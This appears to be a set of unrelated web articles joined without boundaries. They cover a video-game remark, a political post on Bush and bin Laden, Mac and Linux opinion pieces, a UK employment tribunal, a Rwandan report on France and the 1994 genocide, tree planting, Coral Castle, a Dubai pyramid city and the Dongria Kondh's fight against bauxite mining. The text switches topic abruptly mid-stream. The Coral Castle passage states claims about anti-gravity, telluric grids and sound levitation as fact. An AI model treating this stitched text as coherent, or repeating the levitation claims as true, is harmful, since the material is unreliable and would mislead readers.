In all honesty , integrating Kratos into Hot Shots Golf was by far one of the best experiences , as we got to work closely with the God of War team and the casts of characters ( voice over , animators , etc ) that created Kratos in his original form .

I ’m speechless .
Bush has suddenly decided that it ’s time to catch Osama bin Laden .
Conveniently in time for the presidential campaign .
Last year , and the 5 years before that , it was n’t very high up on Bush ’s agenda , avenging the deaths of 3,000 people in the World Trade Center , the Pentagon , and a field in Pennsylvania on September 11 , 2001 .
But now that John McCain ’s presidential race , and Bush ’s legacy , are at stake , suddenly Bush is “ ordering ” his administration to catch Osama .
Why did n’t he give that order six years ago ?
Update :
For a well - reasoned rebuttal to at least my views on design , check out Leigh ’s counter - post once you ’re done reading here .
I ’ve been alluding to this for a few months now , but let me repeat :
The Mac is poised for innovation over the next few years on a scale that we have n’t experienced since the initial move to OS X in the previous decade .
After five years of focusing on new categories like the iPod and the iPhone while gradually improving its Mac product line , the company has now freed up the resources to strengthen its core and highest - revenue business : Macs .
And at the same time , new technologies are emerging to take the Mac to the next level .
To read why , click through .
When Apple released the first iPod in October 2001 , the company ’s future was very much in doubt .
Despite years of cool Mac designs and the roll - out of Mac OS X , Apple ’s market share was worse than ever , and the PowerPC roadmap was already starting to show signs of trouble .
Initially seen as a desperate , niche product , the iPod went on to save Apple , establishing it as a media powerhouse .
But Apple did n’t sleep on its success , immediately beginning work on what became the iPhone , and in the process creating a new platform for its portable media devices .
With the iPhone 3G just more than a week from release , this platform is stable and just starting to take off .
Multi - touch works great , the processor is plenty fast , and storage is getting cheaper and cheaper .
Most of the complaints that remain about the iPhone and iPod touch are software related .
Apple can easily get another two years out of both devices doing little more than increasing capacity and developing new software .
They need maintenance , not innovation .
At most , an iPhone nano or touch nano might come , but these devices wo n’t require nearly the development effort that the original iPhone did .
Implication : Apple ’s best hardware and software teams have time to work on Mac stuff .
Really interesting Mac stuff .
The Architecture of Computing is Changing Dramatically
As you might have noticed , the era of the megahertz myth died a long , long time ago .
Four years ago , the fastest chip that Intel made for desktop computers ran at 3.8 Ghz ( Never quite got to 4 Ghz . ) .
Today ?
The high end is just 3.2 Ghz .
While , I would gladly take a Core 2 Extreme over a Pentium 4 any day of the week , it ’s clear that the way to greater performance these days is not through clock speed but in more efficient use of lots of processors .
Intel has led the way with its Core Duo and Quad lines of chips , but things are about to get really weird .
First of all , NVIDIA , the graphics chip leader , now claims that the CPU has become irrelevant , and future performance advances will come through optimizing the GPU .
Intel , for its part , is introducing Larrabee , an integrated graphics platform that can natively execute CPU x86 code .
That means that when note rendering 3 - D graphics , it can also add a few dozen processing cores to pump up performance in all regards .
Even more amazingly , Intel will , in late 2009 or early 2010 , introduce the Sandy Bridge platform , which is expected to integrate Larrabee onto a single die with Core 4 ( or whatever Intel calls them ) processors , leading to lightning - fast performance .
While that might all sound like electrical engineering inside baseball , it ’s actually revolutionary .
The move to hybrid CPU / GPUs is a computing architecture change bigger than any we ’ve witnessed since Floating Point Units became standard on - die equipment instead of a nice - to - have add - on .
Once hardware truly becomes standard , software becomes optimized for it .
In this case , software will become optimized for incredibly high - bandwidth applications that barely function on today ’s gear .
And Apple has already made it clear in the release notes for OS X Snow Leopard that it will be ready for the advent of GPUs that act like an extension of the main processor before they even ship :
Fully 64 - Bit –
If you ’re going to be tossing around extremely data - intensive applications , you need a ton of RAM available .
Snow Leopard will .

Grand Central – Having two , four , eight , or , as Intel says Larabee will offer , THOUSANDS of processing cores is nice , but having an OS smart enough to efficiently use all of them is even better .
That ’s what Snow Leopard ’s Grand Central technologies are designed for .
It ’s a taskmaster , routing jobs to multiple processors and cores in the most optimal way .
Better , it allows application developers to do the same .

OpenCL – Open Computing Language is designed to allow developers to take advantage of all that untapped GPU power to pump up application performance , so even graphics architectures that can’t natively execute x86 code like Larrabee can pump up general processing tasks .
Then , there ’s also all kinds of cool new tech , from WiMax and LTE to USB 3.0 , eSATA , aGPS , and SSD .
It ’s time to showcase some great ideas that are ready for prime - time .
Implication : Powerful new hardware coupled with an operating system that ’s prepped for it .

The Entire Mac Line is Due For a Face Lift
There is much to be said for a genuinely classic design .
Lovers of the ThinkPad still get misty thinking about how today ’s models look like ones from 16 years ago .
I , and most Mac people , are not like that .
We cherish each Mac as a unique icon of its era , and then we move on to the next era .
But that ’s been hard to do over the last few years .
Apple ’s computer designs are pretty much where they were three years ago , before the move to Intel processors happened .
Today ’s 17 ″ MacBook Pro looks virtually identical to the 17 ″ Powerbook introduced in January of 2003 .
Seriously .
The main difference between the last generation of iBooks and today ’s MacBooks are its latch mechanism and the keyboard .
The Mac Pro is literally identical to the original Power Mac G5 .
The iMac has seen the greatest change , and that was just to put an aluminum finish on an existing design .
The MacBook Air is really different , but it is n’t a core product , nor does it signal a new design direction for the rest of the line .
Heck , the MacBook that ’s available in black is downright revolutionary in this light .
All of which is to say , it ’s time for Apple to make a new statement with the design of its computers .
The time could n’t be better .
All the kinks and problems that came along with the move to Intel chips have been worked out .
People know that Macs are still Macs , and they ’re all safe to use , so the designs can get more wild and divergent again .
I ca n’t wait until they take that leap .
Implication : Jonathan
Ive , I hope you ’re really turning up the heat on the design of the next generation of Macs !
The iPod and the iPhone Have Put the Mac Back in the Spotlight
For years , most experts were skeptical of Apple ’s so - called “ Halo Effect . ”
That is to say , the idea that just by hooking people on iTunes and iPods , Apple could convince people to trade in their PCs for Macs .
It took a long time , but it ’s now clear that this theory was correct ( though the switch to Intel chips made a huge difference , too ) .
According to research firm Net Applications , 8 percent of all computers on the Internet now in use are Macs .
That ’s up 32 percent in just 14 months .
In sales of new computers , Apple is doing even better .
As of May , NPD estimates Apple sells almost 14 percent of all new personal computers in the U.S. , which is the kind of market share the company has n’t seen since the early 1990s .
Apple is actually gaining on the PC guys .
Implication :
We ’ve got the demand ; Apple needs to make with the supply .
Sing it with me :
We want new Macs !
The public is ready for Apple to really tear it up with a killer line of new computers .
The iPod and iPhone lines do n’t need as much attention as they have for the last seven years .
Incredible new hardware and emerging standards will push the limits of what we thought Macs could do .
The existing designs have been around for what seems like forever .
The company ’s computer market share is way up .
For all these reasons and more , Macs are about to get really interesting really soon .
And it ’s about time — innovation in new markets is fun , but innovation at the core of the company is even better .
What are we doing to expose new users to Linux and Open Source solutions ?
My wife , after coming back from a visit to our local electronics store asked me why there were no “ boxes ” of Linux on the shelves , or PCs supporting the OS on display ?
Once upon a time , Red Hat did sell its software in a shrink wrapped box and you could find it on the shelf next to Windows98 .
But that was then and this is now .
Before we get into the heart of this matter , do not bother flaming me about how “ yesterday ” shrink wrapped software is , or that there are plenty of options .
That is not the point .
The point is this – Linux is a powerful combination of software products , regardless of whose distribution you are using , but our visibility to the next generations of computer users is almost nil .
Case in point .
In the 80’s and 90’s , Apple computer ’s “ Apples for the students ” program where they put thousands of Mac into the schools , creating legions of new user .
Most school systems use Windows , either because that is what is in the “ corporate ” back office and is therefore easy to support or that is the only software the teachers know how to use because that is what they have at home .
My buddy Shawn Powers , the LJ Gadget Guy , would argue that Linux is in some schools ( and it is ) , but is it too late ?
The Reader ’s Advisory Board had a discussion thread going the other day about where embedded Linux was being used .
Most of us wondered about this and it was put forward that it is probably in use in more places than we realized but because of a variety of reasons , knowing it was there was harder to determine .
Similarly , unless your IT group is pro-Linux and not afraid to say it , I would be willing to bet that you have no idea how much Linux is really running in the back office of your corporation .
It could be a lot , it could be a little .
Attitudes are changing in IT management towards a more heterogeneous environment , but many still do not want to know the hows and whys , as long as it keeps running .
Linux is the IT industry ’s dirty little secret , the “ glue ” that keeps it all going , with growth more organic than structural .
But how do we expose the next generation of kids to this technology when we are not in their face like other folks , and how do we get in their face and show our value ?
A bullied office worker has been awarded £ 5,000 after her boss raised his right buttock from his chair and broke wind in her direction .
Humiliated mother - of - three Theresa Bailey , 43 , was the only woman on a sales team where " laddish " behaviour made her life a misery , and continued despite complains to senior managers .
Humiliated : Theresa Bailey was only woman to work at Selectabase , above
After she objected to sexist banter a beach ball was thrown at her head - and when she had problems working her computer was ordered to wear a badge saying " I 'm simple " .
Now an employment tribunal has ruled that Mrs Bailey was sexually discriminated against while working for direct marketing firm Selectabase , in Deal , Kent , and awarded her £ 5,146 .
The tribunal , in Ashford , Kent , heard that Mrs Bailey had joined the firm as a telesales account manager in July of last year - but that the treatment she received was so bad she felt she had no option but to leave by September .
There was a general culture of " laddish " behaviour by men in her office , she said - with her line manager David Nye included .
She said he regularly " lifted his right cheek " and broke wind in her direction throughout her brief time at the firm .
Mrs Bailey said colleagues leered at female passers - by and joked that women could n't park cars .
And when she complained about the state of the communal lavatories , Mr Nye sent an email to a colleague that said : " That 's why we do n't employ women " .
Complaints about sexist banter simply led to the incident when the beach ball was thrown at her head - and her confusion about using the computer was found amusing by Mr Nye , who told her to wear the " I 'm simple " badge .
Feeling she had to take matter further , Mrs Bailey sent an email to Selectabase company director Steve Selwood saying : " The number of times the person at my side would lift up his bottom off the chair and fart and think it 's funny is unreal .
" I am no prude but I do think there is a time and a place for that behaviour . "
She told the tribunal , in March , that she ultimately felt she had no choice other than to resign .
Mrs Bailey said : " I felt so embarrassed and humiliated , my heart sank . "
Mrs Bailey , who previously worked for Kent County Council for eight years , and for Next the fashion store , said that she had never experienced such treatment at any other company - but that it had been an extremely difficult decision to leave .
The tribunal agreed that she would not have suffered the same treatment if she had been a man , and also ruled that she was not properly paid after taking time off to see the dentist when her face swelled up .
After the hearing a Selectabase spokesman said the company had 12 years of excellent employee relations and denied any of its employees had acted in an inappropriate , unfair or discriminatory way .
Contacted by the Daily Mail yesterday , Mr Nye refused to comment .
Company director Mr Selwood did not return calls .
On the company website Mr Selwood boasts that his hobbies are snooker and swimming in the Black Sea , and claims that Selectabase are " nice nice , not sugary nice people to deal with " .
France played an active role in the 1994 Rwanda genocide , a report unveiled Tuesday by the Rwandan government said , naming French political and military officials it says should be prosecuted .
The damning report accused a raft of top French politicians of involvement in the massacres , threatening to further mar relations between the two countries , which severed diplomatic ties in November 2006 .
" French forces directly assassinated Tutsis and Hutus accused of hiding Tutsis ...
French forces committed several rapes on Tutsi survivors , " said a justice ministry statement released after the report was presented in Kigali .
The 500 - page report alleged that France was aware of preparations for the genocide , contributed to planning the massacres and actively took part in the killing .
It named former French prime minister Edouard Balladur , former foreign minister Alain Juppe and then - president Francois Mitterrand , who died in 1996 , among 13 French politicians accused of playing a role in the massacres .
A grassroots campaign to plant trees around the globe has announced that it is raising its target from 1 billion trees to 7 billion trees , the United Nations announced today .
The campaign , which is under the patronage of Nobel Peace Prize Laureate and Kenyan Green Belt Movement founder Professor Wangari Maathai and Prince Albert II of Monaco , also announced today that in 18 months it has seen two billion trees planted , double its original target .
The campaign was launched by the UN Environment Programme ( UNEP ) and the World Agroforestry Centre ( ICRAF ) in 2006 as a response to the threat of global warming .
UNEP Executive Director Achim Steiner said today : “ Having exceeded every target that has been set for the campaign , we are now calling on individuals , communities , business and industry , civil society organizations and governments to evolve this initiative on to a new and even higher level by the crucial climate change conference in Copenhagen in late 2009 . ”
Tree planting remains one of the most cost - effective ways to address climate change .
Trees and forests play a vital role in regulating the climate since they absorb carbon dioxide .
Deforestation , in turn , accounts for over 20 % of the carbon dioxide humans generate , rivaling the emissions from other sources .
Trees also play a crucial role in providing a range of products and services to rural and urban populations , including food , timber , fibre , medicines and energy as well as soil fertility , water and biodiversity conservation .
In terms of geographic distribution , Africa is the leading region with over half of all tree plantings .
Regional and national governments organized the most massive plantings , with Ethiopia leading the count at 700 million , followed by Turkey ( 400 million ) , Mexico ( 250 million ) , and Kenya ( 100 million ) .
The two billionth tree was put into the ground as part of an agroforestry project carried out by the UN World Food Programme ( WFP ) .
It has now planted 60 million trees in 35 countries to improve food security .

Coral Castle
Coral Castle - Ancient Alien Theory
Did Edward Leedskalnin use the power of sound waves to defy gravity ?
What other acoustic applications are involved in humanity 's history ?
Many ancient structures were not built with sound but to make sound .
A series of concentric coral circles is said to represent the solar system .
Nearby stand Mars , which he believed sustained life , and Saturn
This 30 ton telescope , towering twenty five feet above the complex , is perfectly aligned to the North Star .
My Friend Ron at Coral Castle June 18 , 2017 Ron's son Ronnie
Gates - Doors - Energy
Entrance to Coral Castle is made through a gate fashioned from a single coral block weighing nine tons .
This miraculous monolith is approximately 80 inches wide , 92 inches tall , and 21 inches thick .
It fits within a quarter of an inch of the walls on either side and pivots through an iron rod resting on an automobile gear .
The enormous block balances so perfectly on its center of gravity that a visitor can easily push it open with one finger .
People who are sensitive to electromagnetic energies fields will sometimes report headaches while standing inside the archway of the nine - ton swinging gate - door - thought to be over a vortex - and a major grid point of the planet .
Does the door across from the one above represent a gate to another dimension ?
Coral Castle is an oolite limestone structure created by the Latvian American eccentric Edward Leedskalnin ( 1887-1951 ) located in Leisure City , Florida , in Miami - Dade County at the intersection of South Dixie Highway ( U.S. 1 ) and SW 157th Avenue .
The structure comprises numerous megalithic stones ( mostly limestone formed from coral ) , each weighing several tons .
It is currently a privately operated tourist attraction .
Coral Castle is noted for legends surrounding its creation that claim it was built single - handedly by Leedskalnin using reverse magnetism or supernatural abilities to move and carve numerous stones weighing many tons .
Coral Castle was built in the early 20th century by an eccentric Latvian recluse named Edward Leedskalnin who allegedly left Latvia when he was rejected by his 16 year old fiance .
He would never marry and would spend 30 years of his life building a Coral Castle and its surrounding buildings , for his alleged ' Sweet Sixteen ' .
Leaving for America , he came down with terminal tuberculosis .
He allegedly spontaneously healed , stating that magnets had some effect on his healing .
Leedskalnin was a 100 pound 5 - foot tall man who wound up in Homestead , Florida on a ten - acre tract of land just south of Miami , Florida .
Somehow he allegedly managed to single - handedly lift and maneuver blocks of megalithic stones , mostly coral , weighing up to 30 tons each , to create not only a castle but other things .
How Leedskalnin worked has never been discovered , though he labored for 30 years .
The veracity of his doing this alone is impossible to prove because he worked at night , hidden from the eyes of observers .
He seemed to know when he was being watched .
On those occasions he would n't lifted the stones and stopped working .
Some suggest Leedskalnin used a form of antigravity device to build the castle .
Numerous designs have been suggested for this device , some using " harmonic sound waves " , some using magnetism , and numerous other proposals .
Leedskalnin himself claimed that he knew the " secret " of the ancient Egyptian pyramids , and some allege he used those secrets to assemble the structure .
He was quoted as saying , " I have discovered the secrets of the pyramids , and have found out how the Egyptians and the ancient builders in Peru , Yucatan , and Asia , with only primitive tools , raised and set in place blocks of stone weighing many tons . "
Most likely Leedskalnin constructed the castle using simple traditional means , as pictures exist of him constructing the castle with blocks and tackle .
Many of the features of the castle are notable , including a table with a flower planted in the middle .
He stated that he wanted the table to have flowers on it every day of the year .
There are also machines to tell time , home - made air conditioners and other electrical devices , as well as a nine - ton revolving door that is so well - balanced that a child could open it with the push of a single finger .

The Well
The Tower
An air of mystery surrounded his two story monolith , known as The Tower , which housed his workshop and living quarters which no one was permitted to enter .
It is located just inside the courtyard , to the immediate right .
Inside is a flight of stone steps ascending to a single doorway near the top .
It leads to the highest point in the area and a small room .
This chamber is occupied only by a leather hammock and a crude wooden table piled with primitive tools - chains , saws , many kinds of drills , wedges , hammers , chisels and crowbars .
Tools also festoon the walls .
This imposing tower was raised with approximately 243 tons of coral cut into cyclopean blocks weighing from four to nine tons each .
Theories
Edward Leedskalnin disputed contemporary science and believed all matter consisted of magnets which could produce measurable phenomena , and electricity .
Ed would say he had rediscovered the laws of weight , measurement , and leverage " and that these concepts involved the relationship of the Earth to celestial alignments .
He claimed to see beads of light which he believed to be the physical presence of nature 's magnetism and life force , or what we term today , ' Chi ' .
Many people report that he used harmonics combined with grid energies and celestial alignments to do his work .
Harmonics are often thought to lift objects .
Tibetan Monks combine their harmonics to elevate heavy objects .
' Tibetan Sound Levitation Of Large Stones Witnessed By Scientist ' .
In his work Diamagnetic Gravity Vortexes , found in the book Anti-Gravity and The World Grid David Hatcher Childress , postulates that the area of South Florida at Coral Castle ( considered part of the Bermuda Triangle ) is a powerful diamagnetic levitator .
Leedskalnin demonstrated magnetism ( EM energies ) , and the mechanism of levitation , by applying the natural Earth Grid principles of diamagnetism .
Leedskalnin could levitate huge pieces of coral by using the center of mass for the needed slight , uplift , launching pressure .
Ed Leedskalnin showed every indication of being a natural geomancer - one who senses the unique telluric forces of the Earth .
He was highly intuitive , and knew how to observe nature for signs of anomaly .
This ultimately led him to the discovery of vortex energy , and the ability to harness the natural elements of magnetism .
He understood the critical nature of identifying the most energetic location to erect his massive Castle , and seemed to have known the secrets of anti-gravity , and its relation to cosmic events .
Ed proceeded to develop a means of leverage power generated from the geomagnetic grid , and produced a system to generate anti-gravity waves .
Edward 's notebooks are laden with schematics for magnetism , and electrical experiments .
Although he possessed only a fourth - grade education , it seems he had discovered a means to reduce the gravitational pull of the earth .
He wrote a series of pamphlets which included his theories on magnetism and cosmic force .
Researchers have speculated that Ed learned the secret of levitation , and one theory in particular caught the imagination of many .
The planetary grid hypothesis postulates that the earth is covered by an invisible web of energy , which is concentrated at points of telluric power , the convergence of which create unusual phenomena .
These telluric grid dynamics played a vital role in the construction of the Castle , according to author Ray Stoner .
In his book The Enigma of Coral Castle , Stoner speculates that the complex was originally moved from Florida City to Homestead , not because of privacy issues ( as most historians suggest ) , but because Ed realized he had made a mathematical error in his original positioning , and moved the entire structure to take advantage of an area with greater telluric force .
In December of 1951 Ed Leedskalnin at age 64 became ill .
He put a sign on the door saying ' Going to the Hospital ' .
He took a bus to Jackson Memorial Hospital in Miami .
Three days later he died in his sleep of malnutrition and kidney failure , taking his secrets with him .
After his death , $ 3,500 was found in the tower ; his life savings , mostly from land sales .
A particularly optimistic design firm in Dubai called Timelinks has proposed designs for the Ziggurat , a complete city to be layered inside of a massive pyramid that could serve as home for a million people at a time .
Timelinks is currently seeking patents for a variety of technologies that would make such a building possible , including a three axis public transportation system that would run residents up , through and across the pyramid .
They 've also claimed that with a hybrid wind , solar and steam power the Ziggurat would be able to meet its own power needs , and that there would be enough room to allow for some minor agriculture in designated " green spaces . "
Before you just write this off as another wacky internet design concept , consider the absurdly ostentatious structures that Dubai has already built , and the fact that unlike the hyperluxurious ego - boosters currently under construction , the Ziggurat might be a viable housing solution for people who do n't have a natural resource - infused trust fund .

High in the monsoon mists in eastern India there is place called Golgola where witchdoctors still make sacrifices to the gods and where the tribes believe the hills are sacred , but where they fear their way of life is under threat .
No roads lead to Golgola , only a muddy track through a lush , green valley .
On either side rise the Niyamgiri hills , thick with forests - wisps of cloud wreath their slopes and a light , misty drizzle coats everything .
Then you plunge into the jungle .
A slippery path snakes through bamboo thickets and under giant jackfruit and mango trees laden with ripe fruit .
For two hours you have to climb what looks an impossibly steep slope .
In the humid air sweat soon drenches everything .
Otherwordly
High on the hillside you pass a pile of stones next to which are several small statues , primitive figures of men and women , their arms outstretched .
This is where the Dongria Kondh people pray to their gods before collecting medicinal plants in the forests .
Then come strange wooden structures , smeared with offerings of fruit .
There is a sense of magic in the air .
The place feels otherworldly .
The sound of drums carries through the forest .
And finally you reach Golgola .
It 's a tiny hamlet in a muddy clearing , with its two lines of long , low - thatched huts , hidden in a high cleft in the hills .
As we entered the village a witchdoctor , swathed in red , was dancing , almost in a trance , swaying in slow circles from house to house .
Her hair was long and unkempt , long strings of beads and shells hung heavy round her neck .
On either side she was flanked by an assistant and behind came two young men in white , bowls on their heads were piled with fruits .
Mud oozing
In front of each doorway the family of every house handed a small chicken to the witchdoctor .
She held it up , reciting prayers to the gods .
Then , in one swift move the bird 's head was ripped from its body , its blood mingled with an offering of rice .
The drums beat .
The witchdoctor danced barefoot , thick mud oozing between her toes .
In pictures : Jungle tribe fighting change Looking on were the villagers , all Dongria Kondh people , women with multiple rings in their noses and ears , many of the men slightly tipsy from jackfruit wine .
Just 7,950 Dongria Kondh are left today .
The Dongria have lived in the Niyamgiri hills in a remote part of eastern India 's Orissa state for centuries .
They survive by gathering fruit , growing small crops of millet and selling jungle plants in the towns at the foot of the hills .
The modern world has yet to reach Golgola - there 's no electricity , no school , no television , no telephones .
" We get everything from the jungle like the fruits we take to the market .
This is like our source of life for our Dongria Kondh peoples , " says Jitu Jakeskia , a young Dongria Kondh activist .
He 's one of the few Dongria to have got a formal education , and he's now fighting to preserve his tribe 's way of life .
" We are not paying any money to get these fruits , this is free , it is like paradise for us here . "
The Dongria are animists .
Every hill is home to its own god .
" Niyam Raja is our supreme god .
His name means Lord of Law , he made all things , " explains Jitu .
" Niyamgiri mountain is the most important place for Dongria Kondh people , it is like Niyam Rajah 's temple , that is why our people worship nature , they have to protect nature . "
Mineral riches
But an arm of the mining giant Vedanta Resources , one of Britain 's biggest listed companies , wants the minerals from Niyamgiri hill .
The Vedanta factory needs legal clearance to mine local bauxite
The range is rich in bauxite , from which aluminium is derived .
Critics say mining the hills may cause severe environmental damage , and could disrupt the Dongria 's way of life .
Sitting outside his hut , Adu made a cutting gesture across his throat when I asked him about Vedanta .
" If they come I will take my axe to them , " he said .
Just over the hills , Vedanta has already arrived .
An Indian subsidiary Vedanta Aluminium Limited has invested $ 1bn in a giant alumina refinery at Lanjigarh .
It 's a vast sprawling site right at the foot of Niyamgiri hill .
A tangle of pipes , silos and vast processing towers cover around six square kilometres ( 3.75 miles ) .
The refinery is losing money .
The Orissa government promised Vedanta access to the bauxite in the hills .
However mining can't begin until India 's Supreme Court has given its clearance .
For now Vedanta is bringing in vast quantities of the red bauxite rock by rail and truck from mines elsewhere just to keep the refinery operating way below its full capacity .
Development potential Orissa is one of India 's poorest states , but also one of the richest in natural resources , so the government is keen to tap its potential .

Advertisement " If you compare iron ore , alumina and coal we can say Orissa has about 60 to 70 % of the reserves a country like Australia has , " says Dr Mukesh Kumar , chief operating officer of Vedanta Aluminium Ltd and head of the Lanjigarh refinery .
" The only problem is they have n't been developed , once we start exploiting these ores , the day is not far away when we will see the same development in Orissa as we see in Australia . "
And Vedanta has big plans .
The bauxite in Orissa is extremely high quality which makes it relatively cheap to refine into aluminium .
Vedanta wants to expand the site fivefold and make it the largest of its kind in the world .
The main use for the metal is in food wrappings for things like chocolate bars , potato crisps and snack foods .
Another big consumer is the auto industry .
As India booms so demand is rising fast in the cities that are far from poverty - hit Orissa .
' Ecosytem threat '
However there are many who are against mining the Niyamgiri hills .
Activist Dhongra Jita Jakeskia says the jungle is like a paradise India 's Wildlife Institute has said that mining threatens an important ecosystem with irreversible changes .
A Supreme Court committee which investigated the project said Vedanta Aluminium violated guidelines in the Forest Conservation
Act when it built its refinery and should have its environmental clearance withdrawn .
And Norway 's official Council on Ethics , which monitors investments for the country 's huge state pension fund , said investing in Vedanta Resources , which has many mining interests , presented " an unacceptable risk of complicity in current and future severe environmental damage and human rights violations " .
Norway 's government sold all the Vedanta shares it held which were worth $ 14 m .
' Best standards ' Vedanta says all the claims are false .
There wo n't be irreversible damage to the environment .
It says it will only mine the surface 10 - 15 metres down in selected areas in the hills and then fill in the holes when it is finished .
" I do n't think any plant can have better environmental standards than we have , " Dr Mukesh Kumar told me .
" Our approach is first protect the environment , ensure safety , ensure development of the local area , ensure participation of the community .
These are our basic four principles , and if we are not able to ensure them then we are not interested in any project . "
Vedanta was keen to show us where it has resettled people displaced by its refinery .
Just over 100 families are housed in a small village of concrete huts .
The firm says it is bringing development and jobs , investing in healthcare and education in the surrounding area .
Children have no formal education Nearly 2,000 people are employed in the refinery , many from the local community .
It has tried to train people in new skills like fish farming and horticulture .
And it is bringing electricity to the villages .
" We have converted land into agriculture land , we have brought soil scientists , we have started livelihood programmes , " said Dr Kumar .
" In the next few years you will see drastic change in the area . "
But while we were there around 80 villagers blockaded the refinery gates , refusing to allow trucks to go in .
Five hundred families have lost land to the refinery and say they 've not had proper compensation .
Vedanta says these claims are false and are made by people wanting more money than they 're legally entitled to .
' Hired goons '
When we visited a village in the shadow of the refinery people told us their fields and homes were illegally seized without consent and police beat up those who protested .
The Supreme Court committee also reported similar claims , saying those who did n't want to move were beaten up , coerced and threatened , and " an atmosphere of fear was created through the hired goons , the police and the administration " .
Dr Mukesh Kumar said not a single case had been registered against Vedanta with the local police , adding that it was the government that repossessed land from villagers so Vedanta was not directly involved .
And he said there was no threat to the existence of the Dongria Kondh in the hills .
" There is no question that Dongria community will finish from this place , that is a false rumour that is spread around this area , " says Dr Kumar .
" They will be there where they are today .
The only thing is that if that area develops they will get better living conditions , because we may develop some roads , some better infrastructure , better communications , better living conditions . "
But in Golgola village many of the Dongria Kondh are suspicious of Vedanta .
Jitu Jakesika insists they wo n't let mining happen in their sacred hills without a fight .
Harsh " If the Supreme Court will give a decision to allow mining here , all our Dongria Kondh people from children to old women will go to the factory and sleep on the road and say first you will kill us then you can mine , because we cannot live without our mountain , " he says .
We watched as the Dongria made a special offering to the gods , the sacrifice of a water buffalo .
It was brutal .
The animal was tied to a stake .
The witchdoctor let out a shriek , and a dozen men set up on the buffalo with sticks and axes .
It bellowed and struggled for its life as they beat it and slashed at it all over .
Finally it sank to the ground with a groan .
Its head was severed and carried back to the village in triumph .
The way of life of the Dongria is still , in many ways , primitive and harsh .
But they fear the sort of development Vedanta wants to bring , as they worry it may mean an end to their ancient way of life .
